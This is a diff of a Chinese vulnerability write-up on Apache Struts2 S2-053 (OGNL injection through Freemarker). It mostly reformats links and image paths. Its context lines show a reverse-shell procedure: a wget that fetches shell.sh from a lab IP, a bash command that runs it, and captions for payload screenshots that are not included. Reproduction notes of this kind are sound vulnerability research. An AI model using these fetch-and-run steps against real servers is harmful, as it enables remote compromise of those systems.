@@ -4,8 +4,8 @@
 
 漏洞详情:
 
-- http://struts.apache.org/docs/s2-053.html
-- https://mp.weixin.qq.com/s?__biz=MzU0NTI4MDQwMQ==&mid=2247483663&idx=1&sn=6304e1469f23c33728ab5c73692b675e
+* http://struts.apache.org/docs/s2-053.html
+* https://mp.weixin.qq.com/s?\_\_biz=MzU0NTI4MDQwMQ==\&mid=2247483663\&idx=1\&sn=6304e1469f23c33728ab5c73692b675e
 
 ## 漏洞影响
 
@@ -33,7 +33,7 @@ Struts2 在使用 Freemarker 模板引擎的时候，同时允许解析 OGNL 表
 
 ```
 
-![image-20220302132454688](images/202203021324760.png)
+![image-20220302132454688](../.gitbook/assets/202203021324760.png)
 
 ### 反弹 shell
 
@@ -52,7 +52,7 @@ wget 192.168.174.128/shell.sh
 
 上传 shell.sh 文件的 Payload 为：
 
-![image-20220302132524059](images/202203021325134.png)
+![image-20220302132524059](../.gitbook/assets/202203021325134.png)
 
 执行 shell.sh 文件的命令为：
 
@@ -62,8 +62,8 @@ bash shell.sh
 
 执行 shell.sh 文件的 Payload 为：
 
-![image-20220302132552428](images/202203021325509.png)
+![image-20220302132552428](../.gitbook/assets/202203021325509.png)
 
 成功接收反弹 shell：
 
-![image-20220302132603933](images/202203021326024.png)
+![image-20220302132603933](../.gitbook/assets/202203021326024.png)
